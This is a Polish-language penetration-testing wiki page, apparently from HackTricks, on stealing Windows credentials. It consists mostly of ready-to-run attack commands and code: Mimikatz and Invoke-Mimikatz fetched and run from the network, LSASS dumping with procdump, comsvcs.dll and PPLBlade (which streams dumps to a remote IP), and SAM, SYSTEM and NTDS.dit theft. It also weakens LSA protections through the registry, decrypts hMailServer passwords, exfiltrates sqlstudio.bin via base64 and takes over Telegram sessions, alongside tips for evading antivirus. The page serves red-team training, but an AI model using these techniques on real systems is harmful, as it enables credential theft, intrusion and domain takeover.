# Kradzież poświadczeń Windows

{{#include ../../banners/hacktricks-training.md}}

## Poświadczenia Mimikatz

```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```

**Znajdź inne rzeczy, które Mimikatz potrafi zrobić na** [**tej stronie**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz

```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```

[**Dowiedz się więcej o możliwych zabezpieczeniach poświadczeń tutaj.**](credentials-protections.md) **Te zabezpieczenia mogą uniemożliwić Mimikatzowi wyodrębnienie niektórych poświadczeń.**

## Credentials with Meterpreter

Użyj utworzonego przeze mnie [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials), **aby wyszukać hasła i hashe** na maszynie ofiary.

```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```

## Omijanie AV

### Procdump + Mimikatz

Ponieważ **Procdump z** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**jest legalnym narzędziem firmy Microsoft**, Defender go nie wykrywa.\
Możesz użyć tego narzędzia, aby **zrzucić proces lsass**, **pobrać zrzut** i **lokalnie wyodrębnić** z niego **poświadczenia**.

Możesz też użyć [SharpDump](https://github.com/GhostPack/SharpDump).

```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```

Ten proces jest wykonywany automatycznie za pomocą [SprayKatz](https://github.com/aas-n/spraykatz): `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Uwaga**: Niektóre programy **AV** mogą **wykrywać** użycie **procdump.exe do zrzucania lsass.exe** jako **złośliwe**, ponieważ **wykrywają** ciągi **„procdump.exe” i „lsass.exe”**. Dlatego **dyskretniej** jest przekazać jako **argument** **PID** lsass.exe zamiast **nazwy lsass.exe**.

### Zrzucanie lsass za pomocą **comsvcs.dll**

Plik DLL o nazwie **comsvcs.dll**, znajdujący się w `C:\Windows\System32`, odpowiada za **zrzucanie pamięci procesu** w przypadku awarii. Ta biblioteka DLL zawiera **funkcję** o nazwie **`MiniDumpW`**, przeznaczoną do wywoływania za pomocą `rundll32.exe`.\
Pierwsze dwa argumenty nie mają znaczenia, ale trzeci składa się z trzech elementów. Pierwszym jest identyfikator procesu, którego pamięć ma zostać zrzucona, drugim — lokalizacja pliku zrzutu, a trzecim — wyłącznie słowo **full**. Nie ma innych dostępnych opcji.\
Po sparsowaniu tych trzech elementów biblioteka DLL tworzy plik zrzutu i zapisuje w nim pamięć wskazanego procesu.\
Można użyć **comsvcs.dll** do zrzucenia procesu lsass, dzięki czemu nie trzeba przesyłać i uruchamiać procdump. Metodę tę szczegółowo opisano na stronie [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).<sup>[[9]](#references)</sup>

Do wykonania używa się następującego polecenia:

```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```

**Możesz zautomatyzować ten proces za pomocą** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Zrzucanie lsass za pomocą Menedżera zadań**

1. Kliknij prawym przyciskiem myszy pasek zadań i kliknij Menedżer zadań
2. Kliknij Więcej szczegółów
3. Na karcie Procesy znajdź proces „Local Security Authority Process”
4. Kliknij prawym przyciskiem myszy proces „Local Security Authority Process” i kliknij „Utwórz plik zrzutu”.

### Zrzucanie lsass za pomocą procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) to podpisany przez Microsoft plik binarny, będący częścią pakietu [sysinternals](https://docs.microsoft.com/en-us/sysinternals/).

Istniejący zrzut awaryjny całego systemu lub jego skompresowana kopia w dostępnym folderze użytkownika mogą zachować dane uwierzytelniające do analizy offline. Nazwy plików, takie jak `MEMORY.DMP` i `MEMORY.7z`, są jedynie wskazówkami do dalszej weryfikacji: sprawdź ich pochodzenie i dostępność oraz nie zakładaj, że zawierają użyteczne lub aktualne dane uwierzytelniające.

```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```

## Offline’owe wyodrębnianie poświadczeń ze snapshotów VM

Czytelna kopia zapasowa VM może zawierać zapisany **obraz pamięci gościa**, nawet bez dostępu do uruchomionego gościa ani LSASS. W przypadku VMware zidentyfikuj metadane snapshotu `.vmsn` oraz powiązany z nimi plik `.vmem`, jeśli jest dostępny; nie pomyl żadnego z nich z obrazem dysku `.vmdk`. `VMkatz` analizuje dane wejściowe w postaci snapshotu lub katalogu VM i może odzyskać [poświadczenia sesji logowania Windows](credentials-mimikatz.md), takie jak hashe i tickety, z pamięci gościa. Może też analizować dyski wirtualne pod kątem danych SAM/LSA. Warunkiem wstępnym jest dostęp do plików kopii zapasowej, a nie uprawnienia debugowania działającej VM.<sup>[[17]](#references)[[18]](#references)</sup>

```bash
vmkatz snapshot.vmsn
vmkatz --disk disk.vmdk snapshot.vmsn   # Resolve paged-out data when a disk is available
vmkatz /path/to/vm-directory/          # Discover supported VM files
```

Przykład w Checkpoint odzyskał hash NT lokalnego Administratora z migawki samodzielnej maszyny wirtualnej. Uwierzytelnił się w domenie dopiero po osobnym potwierdzeniu ponownego użycia hasła; lokalny hash z kopii zapasowej nie jest automatycznie poświadczeniem domenowym. Na hoście z ograniczoną ilością pamięci VMkatz może skanować i zwalniać strony przyrostowo, ale skopiowanie migawki na większy host analityczny może nadal być lepszym rozwiązaniem.<sup>[[17]](#references)[[18]](#references)</sup>

## Zrzucanie lsass za pomocą PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) to narzędzie do zrzucania pamięci chronionych procesów, które obsługuje zaciemnianie zrzutów pamięci i przesyłanie ich do zdalnych stacji roboczych bez zapisywania ich na dysku.

**Kluczowe funkcje**:

1. Omijanie ochrony PPL
2. Zaciemnianie plików zrzutów pamięci w celu uniknięcia mechanizmów wykrywania opartych na sygnaturach w Defenderze
3. Przesyłanie zrzutu pamięci metodami RAW i SMB bez zapisywania go na dysku (zrzut bezplikowy)

```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```

## LalsDumper – zrzucanie LSASS oparte na SSP bez MiniDumpWriteDump

Ink Dragon dostarcza trzyetapowy dumper o nazwie **LalsDumper**, który nigdy nie wywołuje `MiniDumpWriteDump`, więc hooki EDR na tym API nigdy się nie uruchamiają:<sup>[[3]](#references)</sup>

1. **Etap 1: loader (`lals.exe`)** – przeszukuje `fdp.dll` w poszukiwaniu placeholdera składającego się z 32 małych liter `d`, zastępuje go bezwzględną ścieżką do `rtu.txt`, zapisuje zmodyfikowaną bibliotekę DLL jako `nfdp.dll` i wywołuje `AddSecurityPackageA("nfdp","fdp")`. W ten sposób **LSASS** ładuje złośliwą bibliotekę DLL jako nowego dostawcę obsługi zabezpieczeń (SSP).
2. **Etap 2 wewnątrz LSASS** – gdy LSASS ładuje `nfdp.dll`, biblioteka DLL odczytuje `rtu.txt`, wykonuje XOR każdego bajtu z `0x20` i mapuje zdekodowany blob do pamięci przed przekazaniem mu wykonania.
3. **Etap 3: dumper** – zmapowany payload odtwarza logikę MiniDump przy użyciu **direct syscalls** rozwiązywanych na podstawie haszowanych nazw API (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). Dedykowany eksport o nazwie `Tom` otwiera plik `%TEMP%\<pid>.ddt`, zapisuje do niego skompresowany zrzut LSASS i zamyka uchwyt, aby umożliwić późniejszą eksfiltrację.

Uwagi operatora:

* Umieść `lals.exe`, `fdp.dll`, `nfdp.dll` i `rtu.txt` w tym samym katalogu. Etap 1 zastępuje zakodowany na stałe placeholder bezwzględną ścieżką do `rtu.txt`, więc rozdzielenie tych plików przerywa łańcuch.
* Rejestracja odbywa się przez dopisanie `nfdp` do `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`. Możesz samodzielnie dodać tę wartość, aby LSASS ponownie ładował SSP przy każdym uruchomieniu systemu.
* Pliki `%TEMP%\*.ddt` zawierają skompresowane zrzuty. Rozpakuj je lokalnie, a następnie przekaż do Mimikatz/Volatility w celu wyodrębnienia poświadczeń.
* Uruchomienie `lals.exe` wymaga praw administratora/praw SeTcb, aby `AddSecurityPackageA` zakończyło się powodzeniem; po powrocie z wywołania LSASS przejrzyście ładuje złośliwy SSP i wykonuje Etap 2.
* Usunięcie biblioteki DLL z dysku nie usuwa jej z LSASS. Usuń wpis rejestru i uruchom ponownie LSASS (zrestartuj system) albo pozostaw go, aby zapewnić długotrwałą persistence.

## CrackMapExec

### Zrzucanie hashy SAM

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```

### Zrzucanie sekretów LSA

```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```

### Zrzut pliku NTDS.dit z docelowego kontrolera domeny

```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```

### Dump historii haseł NTDS.dit z docelowego DC

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```

### Pokaż atrybut pwdLastSet dla każdego konta w NTDS.dit

```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```

## Wykradanie SAM i SYSTEM

Te pliki powinny znajdować się w _C:\windows\system32\config\SAM_ i _C:\windows\system32\config\SYSTEM._ Nie można ich jednak **po prostu skopiować w zwykły sposób**, ponieważ są chronione.

### Z rejestru

Najłatwiej wykraść te pliki, uzyskując ich kopię z rejestru:

```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```

**Pobierz** te pliki na swoją maszynę Kali i **wyodrębnij hashe** za pomocą:

```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```

### Kopia woluminów w tle

Za pomocą tej usługi możesz kopiować chronione pliki. Musisz mieć uprawnienia Administratora.

#### Używanie vssadmin

Plik binarny vssadmin jest dostępny tylko w wersjach Windows Server.

```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```

Ale możesz zrobić to samo z **PowerShella**. Oto przykład **kopiowania pliku SAM** (używany dysk to „C:”, a plik jest zapisywany w C:\users\Public), ale możesz użyć tej metody do skopiowania dowolnego chronionego pliku:

```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```

Kod z książki: [https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

Na koniec możesz również użyć [**skryptu PS Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1), aby utworzyć kopię plików SAM, SYSTEM i ntds.dit.

```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```

## **Dane uwierzytelniające Active Directory - NTDS.dit**

Plik **NTDS.dit** jest znany jako serce **Active Directory** i zawiera kluczowe dane dotyczące obiektów użytkowników, grup oraz ich członkostwa. To w nim przechowywane są **hashy haseł** użytkowników domeny. Ten plik jest bazą danych **Extensible Storage Engine (ESE)** i znajduje się w lokalizacji **_%SystemRoom%/NTDS/ntds.dit_**.

W tej bazie danych znajdują się trzy główne tabele:

- **Tabela danych**: przechowuje informacje o obiektach, takich jak użytkownicy i grupy.
- **Tabela łączy**: śledzi relacje, takie jak członkostwo w grupach.
- **Tabela SD**: przechowuje **deskryptory zabezpieczeń** każdego obiektu, zapewniając bezpieczeństwo i kontrolę dostępu do przechowywanych obiektów.

Badania Christoffera Anderssona dotyczące warstwy bazy danych opisują te tabele i ich zachowanie zależne od wersji bardziej szczegółowo.<sup>[[8]](#references)</sup>

System Windows używa _Ntdsa.dll_ do interakcji z tym plikiem, a biblioteka ta jest używana przez _lsass.exe_. W efekcie **część** pliku **NTDS.dit** może znajdować się w pamięci procesu **`lsass`** (prawdopodobnie można tam znaleźć ostatnio używane dane ze względu na poprawę wydajności dzięki zastosowaniu **cache**).

#### Odszyfrowywanie hashy w pliku NTDS.dit

Hash jest szyfrowany trzykrotnie:

1. Odszyfruj klucz szyfrowania haseł (**PEK**) za pomocą **BOOTKEY** i **RC4**.
2. Odszyfruj **hash** za pomocą **PEK** i **RC4**.
3. Odszyfruj **hash** za pomocą **DES**.

**PEK** ma **taką samą wartość na każdym kontrolerze domeny**, ale jest **zaszyfrowany** w pliku **NTDS.dit** za pomocą właściwego dla danego kontrolera domeny **BOOTKEY** z jego gałęzi **SYSTEM**. Dlatego wyodrębnienie danych uwierzytelniających wymaga zarówno pliku **NTDS.dit**, jak i **SYSTEM** (`C:\Windows\System32\config\SYSTEM`).

Osobna [technika przekierowania tabeli uchwytów jądra](../../binary-exploitation/windows-kernel-exploitation/file-handle-table-object-redirection.md) może skopiować już otwarty obiekt pliku NTDS bez użycia VSS, ale wymaga prymitywu dowolnego odczytu/zapisu jądra na kontrolerze domeny.<sup>[[16]](#references)</sup>

### Kopiowanie NTDS.dit za pomocą Ntdsutil

Dostępne od Windows Server 2008.

```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```

Możesz także użyć sztuczki [**volume shadow copy**](#stealing-sam-and-system), aby skopiować plik **ntds.dit**. Pamiętaj, że potrzebna będzie również kopia pliku **SYSTEM** (ponownie możesz [**zrzucić go z rejestru lub użyć sztuczki volume shadow copy**](#stealing-sam-and-system)).

### **Ekstrakcja hashy z NTDS.dit**

Po **uzyskaniu** plików **NTDS.dit** i **SYSTEM** możesz użyć narzędzi takich jak _secretsdump.py_, aby **wyodrębnić hashe**:

```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```

Możesz również **wyodrębnić je automatycznie** przy użyciu prawidłowego konta administratora domeny:

```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```

W przypadku **dużych plików NTDS.dit** zaleca się ich wyodrębnianie za pomocą [gosecretsdump](https://github.com/c-sto/gosecretsdump).

Możesz też użyć **modułu metasploit**: _post/windows/gather/credentials/domain_hashdump_ lub **mimikatz** `lsadump::lsa /inject`

### **Wyodrębnianie obiektów domeny z NTDS.dit do bazy danych SQLite**

Obiekty NTDS można wyodrębnić do bazy danych SQLite za pomocą [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite). Wyodrębniane są nie tylko sekrety, ale także całe obiekty i ich atrybuty, co pozwala na dalsze pozyskiwanie informacji z wcześniej pobranego pliku NTDS.dit.

```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```

Gałąź `SYSTEM` jest opcjonalna, ale umożliwia odszyfrowanie sekretów (hashy NT i LM, dodatkowych poświadczeń, takich jak hasła w postaci jawnego tekstu, klucze Kerberos lub zaufania, historia haseł NT i LM). Oprócz innych informacji wyodrębniane są następujące dane: konta użytkowników i komputerów wraz z ich hashami, flagi UAC, znaczniki czasu ostatniego logowania i zmiany hasła, opisy kont, nazwy, UPN, SPN, grupy i członkostwo rekurencyjne, drzewo jednostek organizacyjnych i członkostwo, zaufane domeny wraz z typem, kierunkiem i atrybutami relacji zaufania...

## Lazagne

Pobierz plik binarny [stąd](https://github.com/AlessandroZ/LaZagne/releases). Możesz użyć tego pliku binarnego do wyodrębniania poświadczeń z różnych programów.

```
lazagne.exe all
```

## Inne narzędzia do wyodrębniania poświadczeń z SAM i LSASS

### Windows credentials Editor (WCE)

To narzędzie może służyć do wyodrębniania poświadczeń z pamięci. Pobierz je z: [http://www.ampliasecurity.com/research/windows-credentials-editor/](http://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Wyodrębnia poświadczenia z pliku SAM

```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```

### PwDump

Wyodrębnianie poświadczeń z pliku SAM

```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```

### PwDump7

Pobierz go z:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7), po prostu **uruchom go**, a hasła zostaną wyodrębnione.

## Pozyskiwanie danych z bezczynnych sesji RDP i osłabianie mechanizmów bezpieczeństwa

RAT FinalDraft grupy Ink Dragon zawiera tasker `DumpRDPHistory`, którego techniki przydadzą się każdemu red-teamerowi:<sup>[[3]](#references)</sup>

### Zbieranie telemetrii w stylu DumpRDPHistory

* **Docelowe hosty dla ruchu wychodzącego RDP** – przeanalizuj każdy hive użytkownika w lokalizacji `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Każdy podklucz przechowuje nazwę serwera, `UsernameHint` i znacznik czasu ostatniego zapisu. Możesz odtworzyć logikę FinalDraft za pomocą PowerShell:

  ```powershell
  Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
      Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
        ForEach-Object {
            $server = Split-Path $_.Name -Leaf
            $user = (Get-ItemProperty $_.Name).UsernameHint
            "OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
        }
  }
  ```

* **Ślady przychodzących połączeń RDP** – przeszukaj dziennik `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` pod kątem identyfikatorów zdarzeń **21** (pomyślne logowanie) i **25** (rozłączenie), aby ustalić, kto administrował tym komputerem:

  ```powershell
  Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
    | Where-Object { $_.Id -in 21,25 } \
    | Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
  ```

Gdy już wiesz, który Domain Admin regularnie się łączy, zrzucić LSASS (za pomocą LalsDumper/Mimikatz), póki jego **rozłączona** sesja nadal istnieje. Fallback CredSSP + NTLM pozostawia w LSASS jego verifier i tokeny, które można następnie odtworzyć przez SMB/WinRM, aby pobrać `NTDS.dit` lub wdrożyć mechanizm persistence na kontrolerach domeny.

### Obniżanie zabezpieczeń rejestru ukierunkowane przez FinalDraft

Ten sam implant modyfikuje też kilka kluczy rejestru, aby ułatwić kradzież poświadczeń:<sup>[[3]](#references)</sup>

```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```

* `DisableRestrictedAdmin=1` wyłącza Restricted Admin dla przychodzących połączeń RDP; **nie** umożliwia pass-the-hash w tym trybie. Ustawienie wartości na `0` pozwala na używanie Restricted Admin na komputerze docelowym, ale klient musi zażądać `/RestrictedAdmin` lub korzystać z zasad wymagających Restricted Admin.<sup>[[14]](#references)</sup> Sam hash nie nadaje zdalnych uprawnień administratora; zobacz [wymagania wstępne uwierzytelniania RDP](../../network-services-pentesting/pentesting-rdp.md).<sup>[[15]](#references)</sup>
* `LocalAccountTokenFilterPolicy=1` wyłącza filtrowanie tokenów UAC, dzięki czemu lokalni administratorzy otrzymują nieograniczone tokeny przez sieć.
* `DSRMAdminLogonBehavior=2` umożliwia administratorowi DSRM logowanie się, gdy kontroler domeny jest w trybie online, dając atakującym kolejne wbudowane konto z wysokimi uprawnieniami.
* `RunAsPPL=0` usuwa zabezpieczenia LSASS PPL, dzięki czemu narzędzia do zrzutu, takie jak LalsDumper, mogą z łatwością uzyskać dostęp do pamięci.

## Dane logowania z konfiguracji hMailServer (po przejęciu)

Sprawdź dokładne pliki konfiguracyjne `C:\Program Files\hMailServer\Bin\hMailServer.ini`, `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` i `C:\ProgramData\hMailServer\hMailServer.ini`, zależnie od układu instalacji. Możliwa do odczytania, niepusta wartość `[Security] AdministratorPassword=` to hash hasła administratora hMailServer; nie jest dowodem na to, że jest to hasło administratora Windows. Jeśli to poświadczenie zostanie odzyskane, każda próba pivotu na konto Windows wymaga niezależnego potwierdzenia ponownego użycia hasła i uprawnień do logowania.

W instalacjach korzystających z bazy danych SQL CE osobna wartość `[Database] Password=` w pliku INI zabezpiecza bazę danych. W starszych instalacjach wartość ta jest szyfrowana algorytmem Blowfish ze statycznym kluczem `THIS_KEY_IS_NOT_SECRET` i zamianą kolejności bajtów w 4-bajtowych słowach. Użyj ciągu hex z pliku INI w tym fragmencie kodu Python:<sup>[[2]](#references)</sup>

Najpierw upewnij się, że bieżące konto może odczytać **zarówno** plik INI, jak i odpowiadającą mu bazę danych SQL CE `.sdf`. Hasło z pliku INI zabezpiecza bazę danych; jest oddzielne od hashy kont skrzynek pocztowych zapisanych w jej wnętrzu. Przeglądaj lub aktualizuj **kopię** używanej bazy danych — nigdy aktywny plik.

```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
    return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```

Mając hasło w postaci jawnej, skopiuj bazę danych SQL CE, aby uniknąć blokad plików, załaduj 32-bitowy provider i w razie potrzeby wykonaj aktualizację przed odpytaniem hashy:

```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```

Kolumna `accountpassword` używa formatu hashy hMailServer (tryb hashcat `1421`). Złamane hasło do skrzynki pocztowej umożliwia przejście do konta Windows tylko wtedy, gdy hasło jest ponownie używane przez konto lokalne/domenowe, a konto to ma wymagane uprawnienia do logowania zdalnego.

## Przechwytywanie wywołania zwrotnego logowania LSA (LsaApLogonUserEx2)

Niektóre narzędzia przechwytują **hasła logowania w postaci jawnego tekstu**, przechwytując wywołanie zwrotne logowania LSA `LsaApLogonUserEx2`. Pomysł polega na podpięciu lub opakowaniu wywołania zwrotnego pakietu uwierzytelniania, aby przechwycić poświadczenia **podczas logowania** (przed hashowaniem), a następnie zapisać je na dysku lub zwrócić operatorowi. Zazwyczaj jest to zaimplementowane jako pomocniczy komponent, który wstrzykuje się do LSA lub rejestruje w nim, a następnie zapisuje każde udane interaktywne/sieciowe zdarzenie logowania wraz z nazwą użytkownika, domeną i hasłem.<sup>[[1]](#references)</sup>

Uwagi dotyczące działania:
- Do załadowania pomocniczego komponentu w ścieżce uwierzytelniania wymagane są uprawnienia lokalnego administratora/SYSTEM.
- Przechwycone poświadczenia pojawiają się tylko wtedy, gdy nastąpi logowanie (interaktywne, RDP, usługa lub logowanie sieciowe — zależnie od użytego przechwytywania).

## Zapisane poświadczenia połączeń SSMS (sqlstudio.bin)

SQL Server Management Studio (SSMS) przechowuje zapisane informacje o połączeniach w pliku `sqlstudio.bin` przypisanym do użytkownika. Specjalne narzędzia do zrzucania danych mogą analizować ten plik i odzyskiwać zapisane poświadczenia SQL. W powłokach, które zwracają wyłącznie dane wyjściowe poleceń, plik jest często eksfiltrowany przez zakodowanie go w Base64 i wypisanie na stdout.<sup>[[1]](#references)</sup>

```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```

Po stronie operatora odtwórz plik i uruchom lokalnie dumper, aby odzyskać dane uwierzytelniające:

```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```

## Kradzież sesji przeglądarki i plików cookie za pośrednictwem Chrome DevTools Protocol

{{#ref}}
../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md#enabling-cdp-inside-a-live-chromium-process
{{#endref}}

## Kradzież sesji Telegram Desktop `tdata`

Telegram Desktop przechowuje dane autoryzacji i stan konta w katalogu **`tdata`**. Skopiowaną sesję można załadować za pomocą kompatybilnych narzędzi, aby uwierzytelnić się bez hasła do konta, dopóki autoryzacja pozostaje ważna; jeśli włączono szyfrowanie danych lokalnych, stealer potrzebuje również kodu dostępu. Uwierzytelniona sesja może następnie ujawnić dane tożsamości, metadane dialogów i członkostwa, wiadomości oraz multimedia do pobrania.<sup>[[10]](#references)</sup>

### Wykrywanie i pozyskiwanie

Przeszukaj zarówno zainstalowane, jak i przenośne układy katalogów; nazwy pakietów Microsoft Store są różne, dlatego wylicz katalogi pakietów zawierające `TelegramMessenge` i sprawdź ich podkatalog `LocalCache\Roaming`.<sup>[[10]](#references)</sup>

```powershell
# Standard Telegram Desktop installation
$env:APPDATA + '\Telegram Desktop\tdata'

# Microsoft Store packages
Get-ChildItem "$env:LOCALAPPDATA\Packages" -Directory |
  Where-Object Name -Like '*TelegramMessenge*' |
  ForEach-Object { Get-ChildItem "$($_.FullName)\LocalCache\Roaming" -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue }

# Portable/nonstandard copies (expensive and noisy)
Get-ChildItem C:\ -Recurse -Directory -Filter tdata -ErrorAction SilentlyContinue
```

Jeśli zwykłe odczyty się nie powiodą, a token procesu **już zawiera i ma włączone** `SeBackupPrivilege`, dostęp uwzględniający kopie zapasowe stanowi rozwiązanie awaryjne; nie uzyskuje tego uprawnienia ani nie podnosi uprawnień procesu. `CreateFileW` z `FILE_FLAG_BACKUP_SEMANTICS` może zażądać semantyki tworzenia/przywracania kopii zapasowych i pominąć kontrole zabezpieczeń plików, gdy token zawiera wymagane uprawnienia, ale sama flaga nie omija niezgodnej blokady współdzielenia.<sup>[[10]](#references)[[11]](#references)</sup>

W przypadku używanych, zablokowanych plików utwórz/odczytaj **Volume Shadow Copy**; w przypadku plików zablokowanych przez ACL `robocopy /B` używa trybu kopii zapasowej i omija ACL plików oraz katalogów.<sup>[[10]](#references)[[12]](#references)</sup>

```cmd
whoami /priv
robocopy "%APPDATA%\Telegram Desktop\tdata" "C:\Temp\tdata" /E /B
```

